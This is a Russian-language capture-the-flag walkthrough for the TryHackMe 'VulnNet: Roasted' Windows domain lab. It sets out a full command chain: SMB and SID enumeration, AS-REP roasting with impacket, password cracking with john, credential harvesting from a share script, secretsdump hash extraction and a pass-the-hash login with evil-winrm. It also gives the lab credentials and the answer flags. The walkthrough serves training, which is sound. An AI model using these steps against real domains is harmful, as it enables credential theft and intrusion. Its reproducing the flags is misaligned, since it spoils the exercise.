[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [VulnNet: Roasted](https://tryhackme.com/r/room/vulnnetroasted) 

Всего 1 заданиe:
## Задание 1
VulnNet Entertainment только что развернули новый экземпляр в своей сети с недавно нанятыми системными 
администраторами. Будучи компанией, заботящейся о безопасности, они, как всегда, наняли вас для проведения теста на 
проникновение и проверки работы системных администраторов.  

Уровень сложности: легкий
Операционная система: Windows
Это гораздо более простая машина, не думайте слишком много. Вы можете сделать это, следуя общепринятым методикам.

Примечание: Полная загрузка компьютера может занять до 6 минут.

Значок создан DinosoftLabs с сайта www.flaticon.com

### Ответьте на вопросы ниже
Что такое флаг пользователя? (Desktop\user.txt)
```commandline
nmap -sC -sV -p- <IP>
smbclient -L <IP>
smbmap -u anonymous -H <IP>
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@<IP> | tee users.txt
grep SidTypeUser users.txt | awk '{print $2}' | cut -d "\\" -f2 > users.txt
cat users.txt

python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
        -dc-ip <IP> \ 
        -usersfile users.txt \
        -no-pass \
        vulnnet-rst.local/
        
/data/src/john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# User: t-skid
# Password: tj072889*

smbclient -U vulnnet-rst.local/t-skid //<IP>/NETLOGON
ls
get ResetPassword.vbs -
# User: a-whitehat
# Password: bNdKVkjv3RR9ht

evil-winrm -i <IP> -u a-whitehat -p "bNdKVkjv3RR9ht"
cd enterprise-core-vn\Desktop
cat user.txt
```
```commandline
THM{726b7c0baaac1455d05c827b5561f4ed}
```
Что такое системный флаг? (Desktop\system.txt)
```commandline
python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@<IP>
evil-winrm -i <IP> -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"
```
```commandline
THM{16f45e3934293a57645f8d7bf71d8d4c}
```



[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)